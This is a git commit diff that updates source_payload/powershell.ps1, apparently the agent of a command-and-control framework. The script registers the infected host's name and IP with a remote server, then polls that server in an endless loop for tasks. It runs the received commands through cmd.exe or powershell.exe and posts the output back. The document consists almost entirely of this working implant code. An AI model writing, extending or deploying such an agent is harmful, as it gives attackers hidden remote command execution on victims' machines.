c6f0aeb7e143bdbabc75848e1a5629be14008e5a
SuJin353 <131243461+SuJin353@users.noreply.github.com>
2025-01-11 17:26:04 +0700

    Update powershell.ps1

--- source_payload/powershell.ps1
+++ source_payload/powershell.ps1
@@ -6,41 +6,45 @@ $name = ""
 $host_name = [System.Net.Dns]::GetHostName()
 $type  = "PowerShell"
 $remote_ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
-$regl  = ("http" + ':' + "//$ip" + ':' + "$port/agents")
+$regl  = ("http" + ':' + "//$ip" + ':' + "$port/agents/register")
 $data  = @{
     name = "$host_name"
     type = "$type"
     remote_ip = "$remote_ip"
     }
-$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
-$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
+$agent_name = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
 
-for (;;){
-
-    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
+$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/agents/$agent_name/task")
+$resultl =  ("http" + ':' + "//$ip" + ':' + "$port/agents/$agent_name/result")
+for (;;) {
+    $task = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
 
     if (-Not [string]::IsNullOrEmpty($task)){
-
-        $task = $task.split()
+    	$task = $task.split()
         $flag = $task[0]
 
         if ($flag -eq "VALID"){
+
             $command = $task[1]
             $args    = $task[2..$task.Length]
 
             if ($command -eq "shell"){
+
      		$res = & cmd.exe /c $args | Out-String
                 $data = @{result = "$res"}
 
                 Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
+
             }
-            if ($command -eq "powershell"){
+	    elseif ($command -eq "powershell"){
+
      		$res = & powershell.exe /c $args | Out-String
                 $data = @{result = "$res"}
 
                 Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
+
             }
 	}
-    sleep $n
     }
+    sleep $n
 }
